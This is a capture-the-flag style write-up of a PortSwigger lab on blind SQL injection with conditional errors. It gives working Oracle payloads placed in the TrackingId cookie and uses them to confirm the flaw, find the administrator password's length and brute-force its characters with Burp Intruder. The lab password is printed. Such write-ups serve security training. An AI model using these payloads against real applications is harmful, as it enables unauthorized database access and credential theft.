# 🎯 Platform: PortSwigger
### 📝 Target: Lab - Blind SQL injection with conditional errors

> **Vulnerability Location:** `TrackingId` cookie
> **Goal:** Exploit the blind SQL injection vulnerability to find out the password of the `administrator` user and log in.

---

## 🔍 Analysis
### Find the Indicator for True/False Conditions
*   ✅ **True Condition:** If the SQL query causes an error (e.g., dividing by zero), the application returns a custom error message, specifically a `500 Internal Server Error`.
*   ❌ **False Condition:** If the SQL query does not cause an error, the application responds normally with a `200 OK`.
*   🗄️ **Database Info:** The payloads use `FROM dual` and `TO_CHAR(1/0)`, indicating the backend is an Oracle database. The database contains a `users` table with `username` and `password` columns.

---

## 🚀 Exploitation

### Step 1: Confirm the Vulnerability and Database
*   **Payload:** `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--`
*   **Result:** Received a `500 Internal Server Error`, confirming the conditional error injection works.

### Step 2: Confirm the Administrator User Exists
*   **Payload:** `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')--`
*   **Result:** Received a `500 Internal Server Error`, confirming the `administrator` user exists in the `users` table.

### Step 3: Find the Length of the Administrator Password
*   **Payload:** `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' AND LENGTH(password)=20)--`
*   **Result:** Received a `500 Internal Server Error` when the length was set to `20`, confirming the password is exactly 20 characters long.

### Step 4: Brute-force the Password Characters
*   **Logic / Format:** Use the `SUBSTR` function to extract and check characters one by one.
*   **Example Payload:** `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' AND SUBSTR(password,1,1)='a')--`
*   **Automation:** Set up an Intruder attack to brute-force the characters, filtering the results to show items that returned a `500` status code.
*   **Extracted Password:** `5be98sx5d4180dqwqu7k`

---

## 🛠️ Steps to Reproduce
1. **Access** the lab environment.
2. **Capture** the GET request in Burp Suite and locate the `TrackingId` cookie.
3. **Verify** the condition by forcing a divide-by-zero error using the `CASE WHEN` statement.
4. **Enumerate Length:** Inject the `LENGTH()` payload to determine the password length is `20`.
5. **Execute Intruder:** Use Burp Intruder with Cluster bomb or Sniper (if iterating positions manually) to guess characters using `SUBSTR()`, looking for `500 Internal Server Error` responses.
6. **Authenticate:** Log in to the application using the username `administrator` and the extracted password (`5be98sx5d4180dqwqu7k`).
